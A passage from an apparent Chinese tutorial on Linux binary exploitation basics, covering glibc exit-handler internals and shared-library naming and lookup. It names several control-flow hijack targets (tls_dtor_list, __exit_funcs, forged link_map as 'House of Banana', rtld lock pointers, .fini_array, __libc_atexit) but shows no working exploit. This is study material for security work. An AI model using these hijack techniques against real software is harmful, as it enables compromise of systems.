其中调用的 <code>init</code> 函数如下：<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.init:0000037C push    ebx                             ; _init</span><br><span class="line">.init:0000037D sub     esp, 8</span><br><span class="line">.init:00000380 call    __x86_get_pc_thunk_bx</span><br><span class="line">.init:00000380</span><br><span class="line">.init:00000385 add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.init:0000038B mov     eax, ds:(__gmon_start___ptr - 1FD8h)[ebx]</span><br><span class="line">.init:00000391 test    eax, eax</span><br><span class="line">.init:00000393 jz      short loc_39A</span><br><span class="line">.init:00000393</span><br><span class="line">.init:00000395 call    ___gmon_start__</span><br><span class="line">.init:00000395</span><br><span class="line">.init:0000039A</span><br><span class="line">.init:0000039A loc_39A:                                ; CODE XREF: _init_proc+17↑j</span><br><span class="line">.init:0000039A add     esp, 8</span><br><span class="line">.init:0000039D pop     ebx</span><br><span class="line">.init:0000039E retn</span><br></pre></td></tr></table></figure></div>
在静态链接程序中直接 <code>mov eax, 0; test eax, eax;</code> ，因此这个函数什么也不做。而动态链接程序中由于此时 <code>__gmon_start___@got</code> 为 NULL ，因此同样什么也不做。</li>
</ul>
<p>从 <code>__libc_csu_init</code> 函数返回后会调用 <code>main</code> 函数和 <code>exit</code> 函数。</p>
<h2 id="exit-中的-hook"><a href="#exit-中的-hook" class="headerlink" title="exit 中的 hook"></a>exit 中的 hook</h2><p><code>exit</code> 函数定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//stdlib/exit.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span> &#123;</span><br><span class="line">    __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> attribute_hidden __run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp, <span class="type">bool</span> run_list_atexit) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">    <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="comment">//首先销毁TLS</span></span><br><span class="line">        __call_tls_dtors ();</span><br><span class="line">    <span class="comment">//遍历__exit_funcs,包括_dl_fini</span></span><br><span class="line">    <span class="keyword">while</span> (*listp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        *listp = cur-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">	        <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">        RUN_HOOK (__libc_atexit, ());</span><br><span class="line">    _exit (status);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    _exit (int status) &#123;</span></span><br><span class="line"><span class="comment">        status &amp;= 0xff;</span></span><br><span class="line"><span class="comment">        abort ();</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>首先 <code>__call_tls_dtors</code> 会被 <code>exit</code> 调用。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __call_tls_dtors (<span class="type">void</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (tls_dtor_list) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">        dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">        PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">        func (cur-&gt;obj);</span><br><span class="line"></span><br><span class="line">        atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>泄露 <code>pointer_guard</code> 后可以劫持 <code>tls_dtor_list</code> ，构造 <code>dtor_list</code> 结构体控制 rdi（<code>obj</code> 域）和 rdx（<code>next</code> 域），进而利用 <code>setcontext</code> 来劫持程序执行流程 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> &#123;</span></span><br><span class="line">    dtor_func func;</span><br><span class="line">    <span class="type">void</span> *obj;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>泄露 <code>pointer_guard</code> 后（如果该 glibc 版本加密了该函数指针）可以通过劫持 <code>__exit_funcs</code> 数组来获取控制流。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//遍历__exit_funcs,包括_dl_fini</span></span><br><span class="line"><span class="keyword">while</span> (*listp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line">    <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">	    <span class="keyword">switch</span> (f-&gt;flavor) &#123;</span><br><span class="line">	        <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">	        <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">	        <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"></span><br><span class="line">	        <span class="keyword">case</span> ef_free:</span><br><span class="line">	        <span class="keyword">case</span> ef_us:</span><br><span class="line">	            <span class="keyword">break</span>;</span><br><span class="line">	        <span class="keyword">case</span> ef_on:</span><br><span class="line">	            onfct = f-&gt;func.on.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	            PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	            onfct (status, f-&gt;func.on.arg);</span><br><span class="line">	            <span class="keyword">break</span>;</span><br><span class="line">	        <span class="keyword">case</span> ef_at:</span><br><span class="line">	            atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	            PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	            atfct ();</span><br><span class="line">	            <span class="keyword">break</span>;</span><br><span class="line">	        <span class="keyword">case</span> ef_cxa:</span><br><span class="line">	            cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	            PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	            cxafct (f-&gt;func.cxa.arg, status);</span><br><span class="line">	            <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    *listp = cur-&gt;next;</span><br><span class="line">    <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">free</span> (cur);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>但这种方法只能控制 rsi 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> flavor;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">	    <span class="type">void</span> (*at) (<span class="type">void</span>);</span><br><span class="line">	    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	        <span class="type">void</span> (*fn) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">	        <span class="type">void</span> *arg;</span><br><span class="line">	    &#125; on;</span><br><span class="line">	    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	        <span class="type">void</span> (*fn) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">	        <span class="type">void</span> *arg;</span><br><span class="line">	        <span class="type">void</span> *dso_handle;</span><br><span class="line">	    &#125; cxa;</span><br><span class="line">    &#125; func;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>如果是<strong>动态链接程序</strong> <code>__run_exit_handlers</code> 函数会调用 <code>_dl_fini</code> 函数。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004857778.png"
                      alt="image-20241108004857778"
                ><br><code>_dl_fini</code> 函数定义如下，该函数的主要作用就是依次调用 <code>link_map-&gt;l_info[DT_FINI_ARRAY]</code> 中描述的函数数组中的函数指针。有一种攻击方法就是通过伪造 <code>link_map</code> 来实现控制流劫持，这种攻击方法叫做 <strong>House Of Banana</strong> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//省略了有关SHARED的操作</span></span><br><span class="line"><span class="type">void</span> internal_function _dl_fini (<span class="type">void</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns) &#123;</span><br><span class="line">        __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">        <span class="keyword">if</span> (nloaded == <span class="number">0</span>)</span><br><span class="line">	        __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">	        <span class="keyword">struct</span> link_map *maps[nloaded];</span><br><span class="line">	        <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">	        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">	        assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">	        <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">                <span class="comment">//将_rtld_global.dl_ns[ns]._ns_loaded链表的结点经过check后置入maps</span></span><br><span class="line">	            <span class="keyword">if</span> (l == l-&gt;l_real) &#123;</span><br><span class="line">		            assert (i &lt; nloaded);</span><br><span class="line">                    maps[i] = l;</span><br><span class="line">		            l-&gt;l_idx = i;</span><br><span class="line">		            ++i;</span><br><span class="line">		            ++l-&gt;l_direct_opencount;</span><br><span class="line">	            &#125;</span><br><span class="line">	        assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">	        assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">            <span class="comment">//_ns_loaded链表中至少有三个节点</span></span><br><span class="line">	        <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line">	        _dl_sort_fini (maps, nmaps, <span class="literal">NULL</span>, ns);</span><br><span class="line">	        __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">	        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i) &#123;</span><br><span class="line">	            <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line">                <span class="comment">//遍历执行maps[i]里的函数指针</span></span><br><span class="line">	            <span class="keyword">if</span> (l-&gt;l_init_called) &#123;</span><br><span class="line">		            l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line">		            <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span> || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">	        	        <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">			                _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>, DSO_FILENAME (l-&gt;l_name), ns);</span><br><span class="line">		                <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			                ElfW(Addr) *<span class="built_in">array</span> = (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			                <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">			                <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">			                    ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">			            &#125;</span><br><span class="line">		                <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">			                DL_CALL_DT_FINI (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">		            &#125;</span><br><span class="line">		        &#125;</span><br><span class="line">	            --l-&gt;l_direct_opencount;</span><br><span class="line">	        &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>另外 <code>_dl_fini</code> 中的 <code>__rtld_lock_lock_recursive</code> 和 <code>__rtld_lock_unlock_recursive</code> 宏展开后分别为 <code>_rtld_local._dl_rtld_lock_recursive(&amp;(_rtld_local._dl_load_lock).mutex)</code> 和 <code>_rtld_local._dl_rtld_unlock_recursive(&amp;(_rtld_local._dl_load_lock).mutex)</code> 因此我们可以劫持对应函数指针完成控制流劫持，这些函数指针就是<strong>狭义上的 exit hook</strong> 。</p>
<p>如果是<strong>静态链接程序</strong> <code>__run_exit_handlers</code> 函数会调用 <code>__libc_csu_fini</code> 函数。<code>__libc_csu_fini</code> 函数会依次调用 <code>.fini_array</code> 中的函数指针，因此我们可以通过改写 <code>.fini_array</code> 实现控制流劫持。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_csu_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LIBC_NONSHARED</span></span><br><span class="line">  <span class="type">size_t</span> i = __fini_array_end - __fini_array_start;</span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    (*__fini_array_start [i]) ();</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">ifndef</span> NO_INITFINI</span></span><br><span class="line">  _fini ();</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>之后调用 <code>RUN_HOOK</code> 宏：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    RUN_HOOK(__libc_atexit, ());</span><br></pre></td></tr></table></figure></div>
<p>这个宏展开后的结果如下，可以看到这个宏会依次调用 <code>__start___libc_atexit</code> 函数指针数组直到遇到 NULL 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="type">void</span> *<span class="type">const</span> *ptr;</span><br><span class="line">    <span class="keyword">for</span> (ptr = (<span class="type">void</span> *<span class="type">const</span> *) ((<span class="type">void</span> *<span class="type">const</span> *) (&amp;__start___libc_atexit)); !((ptr) &gt;= (<span class="type">void</span> *<span class="type">const</span> *) &amp;__stop___libc_atexit); ++ptr) (*(<span class="type">____libc_atexit_hook_function_t</span> *) *ptr)();</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>
<p>函数指针所在的内存在动态链接程序中位于 libc 上。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004928203.png"
                      alt="image-20241108004928203"
                ><br>在静态链接程序中位于程序的 <code>__libc_atexit</code> 段。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004951294.png"
                      alt="image-20241108004951294"
                ><br>用于 <strong><code>FSOP</code></strong> 的 <code>_IO_cleanup</code> 就是在这里被调用的，另外如果我们能控制这里的函数指针也可以劫持程序执行流程。</p>
<h1 id="共享库"><a href="#共享库" class="headerlink" title="共享库"></a>共享库</h1><h2 id="共享库版本"><a href="#共享库版本" class="headerlink" title="共享库版本"></a>共享库版本</h2><h3 id="共享库版本命名"><a href="#共享库版本命名" class="headerlink" title="共享库版本命名"></a>共享库版本命名</h3><p>Linux有一套规则来命名系统中的每一个共享库，它规定共享库的文件名规则必须如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">libname.so.x.y.z</span><br></pre></td></tr></table></figure></div>
<p>最前面使用前缀 <code>lib</code> 、中间是库的名字和后缀 <code>.so</code> ，最后面跟着的是三个数字组成的版本号。<code>x</code> 表示主版本号（Major Version Number），<code>y</code> 表示次版本号（Minor Version Number），<code>z</code> 表示发布版本号（Release Version Number）。三个版本号的含义不一样。</p>
<ul>
<li>主版本号表示库的重大升级，不同主版本号的库之间是不兼容的，依赖于旧的主版本号的程序需要改动相应的部分，并且重新编译，才可以在新版的共享库中运行；或者，系统必须保留旧版的共享库，使得那些依赖于旧版共享库的程序能够正常运行。</li>
<li>次版本号表示库的增量升级，即增加一些新的接口符号，且保持原来的符号不变。在主版本号相同的情况下，高的次版本号的库向后兼容低的次版本号的库。</li>
<li>发布版本号表示库的一些错误的修正、性能的改进等，并不添加任何新的接口，也不对接口进行更改。相同主版本号、次版本号的共享库，不同的发布版本号之间完全兼容，依赖于某个发布版本号的程序可以在任何一个其他发布版本号中正常运行，而无须做任何修改。</li>
</ul>
<h3 id="SO-NAME"><a href="#SO-NAME" class="headerlink" title="SO-NAME"></a>SO-NAME</h3><p>系统普遍采用一种叫做 SO-NAME 的命名机制来记录共享库的依赖关系。每个共享库都有一个对应的 SO-NAME ，这个 SO-NAME 即共享库的文件名去掉次版本号和发布版本号，保留主版本号。比如一个共享库叫做 <code>libfoo.so.2.6.1</code> ，那么它的 SO-NAME 即 <code>libfoo.so.2</code> 。很明显，SO-NAME 规定了共享库的接口，SO-NAME 的两个相同共享库，次版本号大的兼容次版本号小的。在 Linux 系统中，系统会为每个共享库在它所在的目录创建一个跟 SO-NAME 相同的并且指向它的软链接（Symbol Link）。比如系统中有存在一个共享库 <code>/lib/libfoo.so.2.6.1</code> ，那么 Linux 中的共享库管理程序就会为它产生一个软链接 <code>/lib/libfoo.so.2</code> 指向它。比如 Linux 系统的 Glibc 共享库（注意稍高版本的 libc 的 <code>libc.so.6</code> 本身就是动态库，不是符号链接）：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -l /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">lrwxrwxrwx 1 root root 12 Apr  7  2022 /lib/x86_64-linux-gnu/libc.so.6 -&gt; libc-2.31.so</span><br><span class="line">$ <span class="built_in">ls</span> -l /lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">-rwxr-xr-x 1 root root 2029592 Apr  7  2022 /lib/x86_64-linux-gnu/libc-2.31.so</span><br></pre></td></tr></table></figure></div>
<p>由于历史原因，动态链接器和 C 语言库的共享对象文件名规则不按 Linux 标准的共享库命名方法，但是 C 语言的 SO-NAME 还是按照正常的规则。</p>
<p>另外动态连接器的 SO-NAME 命名不按照普通的规则。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -al /lib64/ld-linux-x86-64.so.2</span><br><span class="line">lrwxrwxrwx 1 root root 32 Apr  7  2022 /lib64/ld-linux-x86-64.so.2 -&gt; /lib/x86_64-linux-gnu/ld-2.31.so</span><br></pre></td></tr></table></figure></div>

<p>建立以 SO-NAME 为名字的软链接目的是，使得所有依赖某个共享库的模块，在编译、链接和运行时，都使用共享库的 SO-NAME ，而不使用详细的版本号。</p>
<p>动态链接文件中的 <code>.dynamic</code> 段中的 <code>DT_NEED</code> 类型的字段就是 SO-NAME 而不是共享库的完整名字，这样当动态链接器进行共享库依赖文件查找时，就会根据系统中各种共享库目录中的SO-NAME软链接自动定向到最新版本的共享库。</p>
<p>当共享库进行升级的时候，如果只是进行增量升级，即保持主版本号不变，只改变次版本号或发布版本号，那么我们可以直接将新版的共享库替换掉旧版，并且修改 SO-NAME 的软链接指向新版本共享库，即可实现升级；当共享库的主版本号升级时，系统中就会存在多个 SO-NAME ，由于这些 SO-NAME 并不相同，所以已有的程序并不会受影响。</p>
<p>Linux 中提供了一个工具叫做 <code>ldconfig</code> ，当系统中安装或更新一个共享库时，就需要运行这个工具，它会遍历所有的默认共享库目录，比如 <code>/lib</code> 、<code>/usr/lib</code> 等，然后更新所有的软链接，使它们指向最新版的共享库；如果安装了新的共享库，那么 <code>ldconfig</code> 会为其创建相应的软链接。</p>
<h3 id="符号版本"><a href="#符号版本" class="headerlink" title="符号版本"></a>符号版本</h3><p>根据提到的可知，一个程序所依赖的共享库的次版本号如果高于系统中的共享库，那么就不保证该程序能在该系统中运行，这类问题叫做次版本号交会问题（Minor-revision Rendezvous Problem）。</p>
<p>这种次版本号交会问题并没有因为 SO-NAME 的存在而得到任何改善。对于这个问题，现代的系统通过一种更加精巧的方式来解决，那就是符号版本机制。这个方案的基本思路是让每个导出和导入的符号都有一个相关联的版本号，它的实际做法类似于名称修饰的方法。</p>
<p><code>.dynamic</code> 段中的 <code>DT_VERSYM</code> 类型字段包含了符号版本。它的作用是维护库的版本信息，以便在运行时进行版本控制和符号解析。通过 <code>DT_VERSYM</code> ，动态链接器可以确定所链接的库的版本与运行时环境是否兼容，以及选择正确的版本来解析符号。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108005224309.png"
                      alt="image-20241108005224309"
                ></p>
<h2 id="共享库系统路径"><a href="#共享库系统路径" class="headerlink" title="共享库系统路径"></a>共享库系统路径</h2><p>目前大多数包括 Linux 在内的开源操作系统都遵守一个叫做 FHS（File Hierarchy Standard）的标准，这个标准规定了一个系统中的系统文件应该如何存放，包括各个目录的结构、组织和作用，这有利于促进各个开源操作系统之间的兼容性。共享库作为系统中重要的文件，它们的存放方式也被 FHS 列入了规定范围。FHS 规定，一个系统中主要有两个存放共享库的位置，它们分别如下：</p>
<ul>
<li><code>/lib</code>：该目录包含操作系统核心组件所需的共享库文件。这些库文件通常是系统引导和运行时所必需的，例如与操作系统内核相关的库文件。</li>
<li><code>/usr/lib</code>：该目录包含操作系统提供的额外共享库文件。这些库文件用于支持系统上安装的应用程序和工具的运行，如图形界面工具包（GUI toolkit）、网络库、数据库驱动程序等。</li>
<li><code>/usr/local/lib</code>：该目录是用于安装本地（local）软件的库文件的默认位置。当用户手动编译和安装软件到系统时，通常会将其安装到 <code>/usr/local</code> 目录下。因此，相关的库文件也会被安装到 <code>/usr/local/lib</code> 目录下。</li>
</ul>
<h2 id="共享库查找过程"><a href="#共享库查找过程" class="headerlink" title="共享库查找过程"></a>共享库查找过程</h2><p>动态链接器对于模块的查找有一定的规则：如果 <code>DT_NEED</code> 里面保存的是绝对路径，那么动态链接器就按照这个路径去查找；如果 <code>DT_NEED</code> 里面保存的是相对路径，那么动态链接器会在 <code>/lib</code> 、<code>/usr/lib</code> 和由 <code>/etc/ld.so.conf</code> 配置文件指定的目录中查找共享库。为了程序的可移植性和兼容性，共享库的路径往往是相对的。</p>
<p><code>ld.so.conf</code> 是一个文本配置文件，它可能包含其他的配置文件，这些配置文件中存放着目录信息。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ <span class="built_in">cat</span> /etc/ld.so.conf         </span><br><span class="line">include /etc/ld.so.conf.d/*.conf</span><br><span class="line"></span><br><span class="line">➜  ~ <span class="built_in">cat</span> /etc/ld.so.conf.d/*.conf               </span><br><span class="line">/usr/lib/x86_64-linux-gnu/libfakeroot</span><br><span class="line"><span class="comment"># Multiarch support</span></span><br><span class="line">/usr/local/lib/i386-linux-gnu</span><br><span class="line">/lib/i386-linux-gnu</span><br><span class="line">/usr/lib/i386-linux-gnu</span><br><span class="line">/usr/local/lib/i686-linux-gnu</span><br><span class="line">/lib/i686-linux-gnu</span><br><span class="line">/usr/lib/i686-linux-gnu</span><br><span class="line"><span class="comment"># libc default configuration</span></span><br><span class="line">/usr/local/lib</span><br><span class="line"><span class="comment"># Multiarch support</span></span><br><span class="line">/usr/local/lib/x86_64-linux-gnu</span><br><span class="line">/lib/x86_64-linux-gnu</span><br><span class="line">/usr/lib/x86_64-linux-gnu</span><br><span class="line"><span class="comment"># Legacy biarch compatibility support</span></span><br><span class="line">/lib32</span><br><span class="line">/usr/lib32</span><br></pre></td></tr></table></figure></div>
<p>如果动态链接器在每次查找共享库时都去遍历这些目录，那将会非常耗费时间。所以 Linux 系统中都有一个叫做 <code>ldconfig</code> 的程序，这个程序的作用是为共享库目录下的各个共享库创建、删除或更新相应的 SO-NAME（即相应的符号链接），这样每个共享库的 SO-NAME 就能够指向正确的共享库文件；并且这个程序还会将这些 SO-NAME 收集起来，集中存放到 <code>/etc/ld.so.cache</code> 文件里面，并建立一个 SO-NAME 的缓存。当动态链接器要查找共享库时，它可以直接从 <code>/etc/ld.so.cache</code> 里面查找。而 <code>/etc/ld.so.cache</code> 的结构是经过特殊设计的，非常适合查找，所以这个设计大大加快了共享库的查找过程。</p>
<p>如果动态链接器在 <code>/etc/ld.so.cache</code> 里面没有找到所需要的共享库，那么它还会遍历 <code>/lib</code> 和 <code>/usr/lib</code> 这两个目录，如果还是没找到，就宣告失败。</p>
<p>所以理论上讲，如果我们在系统指定的共享库目录下添加、删除或更新任何一个共享库，或者我们更改了 <code>/etc/ld.so.conf</code> 的配置，都应该运行 <code>ldconfig</code> 这个程序，以便调整 SO-NAME 和 <code>/etc/ld.so.cache</code> 。很多软件包的安装程序在往系统里面安装共享库以后都会调用 <code>ldconfig</code> 。</p>
<h2 id="更改共享库"><a href="#更改共享库" class="headerlink" title="更改共享库"></a>更改共享库</h2><p>Linux 系统提供了很多方法来改变动态链接器装载共享库路径的方法，通过使用这些方法，我们可以满足一些特殊的需求，比如共享库的调试和测试、应用程序级别的虚拟等。</p>
<h3 id="LD-LIBRARY-PATH"><a href="#LD-LIBRARY-PATH" class="headerlink" title="LD_LIBRARY_PATH"></a>LD_LIBRARY_PATH</h3><p>在 Linux 系统中，<code>LD_LIBRARY_PATH</code> 是一个由若干个路径组成的环境变量，每个路径之间由冒号隔开。默认情况下， <code>LD_LIBRARY_PATH</code> 为空。如果我们为某个进程设置了 <code>LD_LIBRARY_PATH</code> ，那么进程在启动时，动态链接器在查找共享库时，会首先查找由 <code>LD_LIBRARY_PATH</code> 指定的目录。这个环境变量可以很方便地让我们测试新的共享库或使用非标准的共享库。</p>
<p>比如更换 <code>libdl.so.2</code> 和 <code>libc.so.6</code> 的 pwntools 脚本如下：</p>
